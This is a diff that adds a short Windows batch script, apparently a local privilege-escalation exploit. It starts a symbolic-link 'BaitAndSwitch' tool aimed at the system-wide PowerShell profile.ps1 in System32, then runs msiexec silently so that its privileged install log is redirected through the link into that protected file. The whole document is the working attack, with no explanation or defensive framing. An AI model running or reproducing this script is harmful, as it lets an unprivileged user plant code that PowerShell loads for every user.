@@ -1,0 +1,5 @@
+@echo off
+echo > C:\temp\fakelog.txt
+start C:\temp\BaitAndSwitch C:\temp\linkdir\link C:\temp\fakelog.txt C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
+timeout /t 1
+msiexec /j C:\temp\example.msi /t ksz /Li! C:\temp\linkdir\link /qn
